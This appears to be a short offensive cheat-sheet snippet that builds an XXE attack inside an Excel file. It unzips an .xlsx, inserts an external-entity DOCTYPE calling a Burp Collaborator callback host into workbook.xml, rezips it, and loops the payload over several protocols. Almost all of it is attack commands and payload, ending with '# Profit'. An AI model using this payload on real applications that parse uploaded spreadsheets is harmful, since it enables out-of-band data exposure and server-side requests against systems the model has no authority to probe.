# Extract the Excel file
mkdir xxe && cd xxe
unzip ../xxe_[protocol].xlsx

# Add payload to xl/workbook.xml
<xml ...>
<!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
<x>&xxe;</x>
<workbook...>

# Rebuild the Excel file
zip -r ../xxe_[protocol].xlsx *

# One-liner
for protocol in $(cat ../xxe_protocols.txt); do sed "s|PROTOCOL|$protocol|g" xxe/xl/workbook.xml | sed 's/PAYLOAD/<burp_collaborator_payload_id>/';done

# Profit
